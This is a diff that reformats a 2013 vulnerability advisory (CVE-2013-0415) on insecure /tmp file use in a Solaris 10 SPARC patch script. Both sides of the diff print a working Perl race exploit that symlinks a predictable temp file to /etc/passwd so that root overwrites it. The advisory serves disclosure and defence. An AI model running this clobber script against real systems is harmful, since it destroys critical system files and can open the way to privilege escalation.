@@ -1,54 +1,60 @@
-                                Advisory #: 14
-Title: Insecure /tmp file use solaris 10 patch cluster for sparc
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-01-15
-Download Site: www.oracle.com
-Vendor:Sun Microsystems
-Vendor Notified: 2013-01-15
-Vendor Contact: bugtraq email
-Description: Solaris Sparc Patch cluster
-Vulnerability:
-Temp file creation using process id in solaris 10 patch cluster for sparc
-CVE- 2013-0415
-JSON:Export
-Exploit Code:
-   1. patches/137097-01/SUNWcsr/reloc/lib/svc/method/inetd-upgrade
-   2.  
-   3. lines :
-   4.  
-   5. 72 inetdconf_entries_file=/tmp/iconf_entries.$$ 73
-   6. 74 # Create sed script that prints out inetd.conf src line from inetconv
-      generated 75 # manifest.
-   7. 76 cat <<EOF > /tmp/inetd-upgrade.$$.sed 77 /propval name='source_line'/{
-   8. 78 n
-   9. 79 s/'//g
-  10. 80 p
-  11. 81 }
-  12. 82 /from the inetd.conf(4) format line/{ 83 n
-  13. 84 p
-  14. 85 }
-  15. 86 EOF
-  16.  
-  17. if 137097-01 is applied and changes need to be made to the inetd.conf
-      file a malicious user can over write the contents of a root owned file
-      with a simple script:
-  18.  
-  19. #!/usr/bin/perl
-  20. $clobber = "/etc/passwd";
-  21. while(1) {
-  22. open ps,"ps -ef | grep -v grep |grep -v PID |";
-  23.  
-  24. while(<ps>) {
-  25. @args = split " ", $_;
-  26.  
-  27. if (/inetd-upgrade/) {
-  28.  
-  29.         print "Symlinking iconf_entries.$args[1] to  $clobber\n";
-  30.         symlink($clobber,"/tmp/iconf_entries.$args[1]");
-  31.         exit(1);
-  32. }
-  33. }
-  34.  
-  35. }
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/SUNWcsr_tmp_clobber.html
+
+                               Advisory #: 14
+
+   Title: Insecure /tmp file use solaris 10 patch cluster for sparc
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-01-15
+   Download Site: www.oracle.com
+   Vendor: Sun Microsystems
+   Vendor Notified: 2013-01-15
+   Vendor Contact: bugtraq email
+   Description: Solaris Sparc Patch cluster
+   Vulnerability:
+   Temp file creation using process id in solaris 10 patch cluster for
+   sparc
+   CVE- 2013-0415
+   JSON: Export
+   Exploit Code:
+
+    1. patches/137097-01/SUNWcsr/reloc/lib/svc/method/inetd-upgrade
+    2.
+    3. lines :
+    4.
+    5. 72 inetdconf_entries_file=/tmp/iconf_entries.$$ 73
+    6. 74 # Create sed script that prints out inetd.conf src line from
+       inetconv generated 75 # manifest.
+    7. 76 cat <<EOF > /tmp/inetd-upgrade.$$.sed 77 /propval
+       name='source_line'/{
+    8. 78 n
+    9. 79 s/'//g
+   10. 80 p
+   11. 81 }
+   12. 82 /from the inetd.conf(4) format line/{ 83 n
+   13. 84 p
+   14. 85 }
+   15. 86 EOF
+   16.
+   17. if 137097-01 is applied and changes need to be made to the
+       inetd.conf file a malicious user can over write the contents of a
+       root owned file with a simple script:
+   18.
+   19. #!/usr/bin/perl
+   20. $clobber = "/etc/passwd";
+   21. while(1) {
+   22. open ps,"ps -ef | grep -v grep |grep -v PID |";
+   23.
+   24. while(<ps>) {
+   25. @args = split " ", $_;
+   26.
+   27. if (/inetd-upgrade/) {
+   28.
+   29. print "Symlinking iconf_entries.$args[1] to $clobber\n";
+   30. symlink($clobber,"/tmp/iconf_entries.$args[1]");
+   31. exit(1);
+   32. }
+   33. }
+   34.
+   35. }
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisories/SUNWcsr_tmp_clobber.html
